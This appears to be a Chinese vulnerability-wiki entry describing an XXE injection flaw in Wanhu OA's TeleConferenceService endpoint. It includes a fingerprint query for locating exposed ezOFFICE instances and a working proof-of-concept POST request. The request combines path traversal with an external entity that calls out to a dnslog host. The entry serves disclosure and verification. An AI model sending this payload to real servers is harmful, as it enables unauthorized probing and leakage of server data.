---
title: "万户OA TeleConferenceService XXE注入漏洞"
date: 2026-10-17 09:12:03
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "万户OA"
tags:
  - "万户OA"
  - "信息泄露"
  - "XXE"
  - "漏洞复现"
---
## 漏洞描述

万户OA TeleConferenceService接口存在XXE注入漏洞，攻击者通过漏洞可以继续XXE注入获取服务器敏感信息

## 漏洞影响

```
万户OA
```

## 网络测绘

```
app="万户网络-ezOFFICE"
```

## 漏洞复现

产品页面

![1](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202209131048922.png)

验证POC

```
POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "http://fep6kf.dnslog.cn" >]>        
<value>&xxe;</value>
```

![2](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202209131049806.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E4%B8%87%E6%88%B7OA-TeleConferenceService-XXE%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
